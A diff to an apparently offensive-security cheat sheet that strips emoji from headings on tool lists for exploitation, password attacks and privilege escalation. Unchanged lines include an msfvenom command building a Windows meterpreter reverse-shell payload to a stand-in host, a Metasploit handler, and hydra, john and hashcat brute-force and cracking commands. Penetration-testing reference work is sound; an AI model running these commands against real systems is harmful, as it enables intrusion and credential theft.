@@ -36,9 +36,9 @@ Windows
 - windows-exploit-suggester: Sugestões de exploits
 - powerup: PowerShell privilege escalation
 
-💥 System Hacking Tools
+System Hacking Tools
 
-⚔️ Exploitation Frameworks
+Exploitation Frameworks
 
 Metasploit Framework
 
@@ -69,7 +69,7 @@ Exploit Databases
 * [exploit-db.com](https://www.exploit-db.com)
   ↳ Online exploit database
 
-🔐 Password Attacks
+Password Attacks
 
 Brute Force Tools
 
@@ -120,10 +120,9 @@ Hash Cracking Tools
 * `ophcrack`
   ↳ Uses rainbow tables to crack Windows hashes
 
+Privilege Escalation
 
-🧨Privilege Escalation
-
-🐧Linux
+Linux
 
 * `linpeas.sh`
   ↳ Privilege escalation auditing (automated & colored)
@@ -144,7 +143,7 @@ Hash Cracking Tools
   ./linux-exploit-suggester.sh
   
 
- 🪟 Windows
+ Windows
 
 * `winpeas.exe`
   ↳ Comprehensive privilege escalation enumeration
@@ -165,9 +164,9 @@ Hash Cracking Tools
   Import-Module .\PowerUp.ps1
   Invoke-AllChecks
 
-🛠️ Scripts & One-Liners
+Scripts & One-Liners
 
- 📦 Metasploit
+ Metasploit
 
 
 msfconsole
@@ -178,13 +177,13 @@ set LPORT 4444
 exploit
 
 
- 🧬 Payload Generation
+ Payload Generation
 
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe -o payload.exe
 
 
- 🔓 Brute Force SSH
+ Brute Force SSH
 
 
 hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://target
@@ -197,7 +196,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
 
 
- 📈 Privilege Escalation Enumeration
+ Privilege Escalation Enumeration
 
 
 # Linux
